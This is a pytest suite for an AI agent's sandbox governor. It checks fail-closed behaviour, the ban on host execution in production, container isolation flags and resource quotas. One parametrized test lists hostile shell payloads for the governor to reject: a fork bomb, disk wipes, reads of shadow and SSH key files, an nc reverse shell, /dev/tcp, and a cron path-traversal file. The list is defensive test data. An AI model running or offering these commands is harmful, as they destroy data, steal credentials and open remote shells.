"""Workstream 03: Secure Execution and Sandboxing Verification Test Suite.

Validates the 5 mandatory security criteria:
1. All agent-to-shell, container, browser and device execution routes audited and gated.
2. Untrusted commands cannot escape to host execution (zero host breakout).
3. Hardened container isolation (Docker, Podman, E2B microVMs) with fail-closed behavior.
4. Enforcement of resource limits: CPU, memory, timeout, network, read-only rootfs, and disk quotas.
5. Adversarial payload detection, subshell evasion prevention, and anti-spoofing governance.
"""

from __future__ import annotations

import os
import subprocess
import pytest
from unittest.mock import MagicMock, AsyncMock

from agent.core.exceptions import SandboxExecutionError
from agent.core.manifest import SandboxConfig
from cognitive.action.agent.sandbox.local_docker_adapter import (
    LocalDockerSandboxAdapter,
    BLOCKED_COMMAND_PATTERNS,
)
from cognitive.action.agent.sandbox.e2b_adapter import E2BSandboxAdapter
from sandboxes.core.models import (
    ExecutionRequest,
    ResourceLimits,
    SandboxResult,
    SandboxStatus,
    SandboxTimeoutError,
)
from sandboxes.governor.security_governor import (
    SecurityGovernor,
    MAX_ALLOWED_TIMEOUT_SECONDS,
    MAX_ALLOWED_MEMORY_MB,
    MAX_ALLOWED_OUTPUT_BYTES,
    MAX_ALLOWED_FILES_COUNT,
    MAX_ALLOWED_TOTAL_FILE_BYTES,
)
from sandboxes.manager import SandboxManager
from sandboxes.runner.docker_runner import DockerRunner
from sandboxes.runner.local_process_runner import LocalProcessRunner
from sandboxes.trusted_host import (
    TRUSTED_HOST_TOKEN_ENV,
    TrustedExecutionContext,
    TrustedExecutionAuditEntry,
    TrustedHostExecutionError,
    TrustedHostExecutionPolicy,
    TrustedHostProcessRunner,
)


# ==============================================================================
# WS-03.1: Execution Route Auditing & Fail-Closed Boundaries
# ==============================================================================

@pytest.mark.asyncio
async def test_untrusted_agent_command_never_falls_back_to_host():
    """Agent sandbox adapter must fail closed rather than fall back to host."""
    adapter = LocalDockerSandboxAdapter(manager=None, allow_local_fallback=False)
    config = SandboxConfig(required=True, timeout_seconds=10)

    with pytest.raises(SandboxExecutionError) as exc_info:
        await adapter.execute_command(
            command="whoami",
            config=config,
            project_id="test-proj",
        )

    err = str(exc_info.value).lower()
    assert "prohibited sandbox fallback" in err
    assert "host execution is strictly forbidden" in err


def test_local_process_runner_blocks_without_valid_trusted_context(tmp_path):
    """LocalProcessRunner must reject any execution that lacks an authorized trusted context."""
    runner = LocalProcessRunner()
    req = ExecutionRequest(
        language="python",
        code="print('should not execute')",
    )

    result = runner.execute(req, scratch_dir=str(tmp_path))
    assert result.status == SandboxStatus.BLOCKED
    assert result.exit_code == -1
    assert "strictly prohibited" in result.stderr.lower()


# ==============================================================================
# WS-03.2: Production Non-Escapability & Host Immunity
# ==============================================================================

@pytest.mark.parametrize("prod_env", ["production", "prod", "live"])
def test_production_guard_unconditionally_forbids_host_execution(prod_env, monkeypatch, tmp_path):
    """Even with a valid trusted context, host execution is unconditionally forbidden in production."""
    monkeypatch.setenv("ENV", prod_env)
    monkeypatch.setenv("ENVIRONMENT", prod_env)
    monkeypatch.setenv(TRUSTED_HOST_TOKEN_ENV, "super-secret-token")

    ctx = TrustedExecutionContext(
        caller_id="system-ci",
        capability="SYSTEM_DIAGNOSTIC",
        auth_token="super-secret-token",
    )
    req = ExecutionRequest(
        language="python",
        code="print('never run in prod')",
        trusted_context=ctx,
    )

    runner = LocalProcessRunner()
    result = runner.execute(req, scratch_dir=str(tmp_path))
    assert result.status == SandboxStatus.BLOCKED
    assert "strictly forbidden in production" in result.stderr.lower()


# ==============================================================================
# WS-03.3: Docker / Podman / E2B Container Isolation & Fail-Closed
# ==============================================================================

def test_docker_and_podman_cli_isolation_flags():
    """Both Docker and Podman runners must generate hardened container isolation flags."""
    for runtime_bin in ["docker", "podman"]:
        captured_cmd = []

        def fake_runner(cmd, **kwargs):
            captured_cmd.extend(cmd)
            return subprocess.CompletedProcess(args=cmd, returncode=0, stdout="isolated", stderr="")

        runner = DockerRunner(command_runner=fake_runner, container_bin=runtime_bin)
        req = ExecutionRequest(
            language="python",
            code="print('safe')",
            limits=ResourceLimits(timeout_seconds=20.0),
        )

        result = runner.execute(req)
        assert result.status == SandboxStatus.SUCCESS

        # Verify CLI arguments
        assert captured_cmd[0] == runtime_bin
        assert captured_cmd[1] == "run"
        assert "--rm" in captured_cmd
        assert "-i" in captured_cmd
        assert "--read-only" in captured_cmd
        assert "--network" in captured_cmd
        assert captured_cmd[captured_cmd.index("--network") + 1] == "none"
        assert "--memory=512m" in captured_cmd
        assert "--cpus=1.0" in captured_cmd
        assert any("/tmp:rw,noexec,nosuid" in arg for arg in captured_cmd)


@pytest.mark.asyncio
async def test_e2b_adapter_fails_closed_in_live_mode_when_no_docker_or_e2b(monkeypatch):
    """When E2B cloud is unconfigured and local docker fails, E2BSandboxAdapter fails closed."""
    monkeypatch.setenv("E2B_MODE", "live")
    monkeypatch.setenv("CI_TEST_MODE", "0")
    monkeypatch.setattr(DockerRunner, "is_docker_available", lambda self: False)

    adapter = E2BSandboxAdapter(api_key=None, _defer_prod_check=True)
    with pytest.raises(Exception) as exc_info:
        await adapter.execute_command("echo 'test'")

    assert "sandbox" in str(exc_info.value).lower() or "available" in str(exc_info.value).lower()


# ==============================================================================
# WS-03.4: Resource, Memory, Filesystem, and Network Limits
# ==============================================================================

def test_resource_limits_governor_enforcement():
    """SecurityGovernor enforces all Feature 5.33 hard ceiling limits."""
    gov = SecurityGovernor()

    # 1. Timeout limits
    valid, err = gov.validate_resource_limits(ResourceLimits(timeout_seconds=-5))
    assert not valid and "must be positive" in err

    valid, err = gov.validate_resource_limits(ResourceLimits(timeout_seconds=MAX_ALLOWED_TIMEOUT_SECONDS + 10))
    assert not valid and "exceeds hard ceiling" in err

    # 2. Memory limits
    valid, err = gov.validate_resource_limits(ResourceLimits(max_memory_mb=MAX_ALLOWED_MEMORY_MB + 512))
    assert not valid and "exceeds hard ceiling" in err

    # 3. Output byte limits
    valid, err = gov.validate_resource_limits(ResourceLimits(max_output_bytes=MAX_ALLOWED_OUTPUT_BYTES + 1024))
    assert not valid and "exceeds hard ceiling" in err


def test_virtual_disk_and_file_quotas():
    """SecurityGovernor strictly enforces file count and file size limits."""
    gov = SecurityGovernor()

    # Exceeding file count
    overflow_files = {f"file_{i}.txt": "abc" for i in range(MAX_ALLOWED_FILES_COUNT + 1)}
    valid, err = gov.validate_files_quota(overflow_files, ResourceLimits())
    assert not valid and "exceeds allowed limit" in err

    # Individual file size exceeded
    oversized = {"big.bin": "Z" * (11 * 1024 * 1024)}
    valid, err = gov.validate_files_quota(oversized, ResourceLimits(max_file_size_bytes=10 * 1024 * 1024))
    assert not valid and "exceeds individual size limit" in err


def test_network_access_blocked_by_default():
    """By default, network access attempts in code are rejected by static analysis."""
    gov = SecurityGovernor()
    req = ExecutionRequest(
        language="python",
        code="import socket\ns = socket.socket()",
        limits=ResourceLimits(network_access=False),
    )
    valid, err = gov.validate_request(req)
    assert not valid
    assert "Network access is disabled" in err


# ==============================================================================
# WS-03.5: Adversarial Escape & Injection Protection
# ==============================================================================

@pytest.mark.parametrize("payload", [
    ":(){ :|:& };:",
    "rm -rf /",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    "cat /etc/shadow",
    "cat /etc/passwd",
    "nc -e /bin/sh 10.0.0.1 4444",
    "/dev/tcp/127.0.0.1/8080",
    "cat .ssh/id_rsa",
    "cat .vault_key",
])
def test_adversarial_patterns_blocked_by_governor(payload):
    """All dangerous commands and patterns are statically rejected by SecurityGovernor."""
    gov = SecurityGovernor()
    req = ExecutionRequest(language="shell", code=payload)
    valid, err = gov.validate_request(req)
    assert not valid
    assert "blocked" in err.lower() or "violates security policy" in err.lower()


def test_path_traversal_in_virtual_files_blocked():
    """Path traversal in virtual scratchpad files must be blocked."""
    gov = SecurityGovernor()
    traversal_files = {
        "../../etc/cron.d/evil": "evil payload",
    }
    req = ExecutionRequest(language="python", code="print(1)", files=traversal_files)
    valid, err = gov.validate_request(req)
    assert not valid
    assert "Path traversal attempt detected" in err
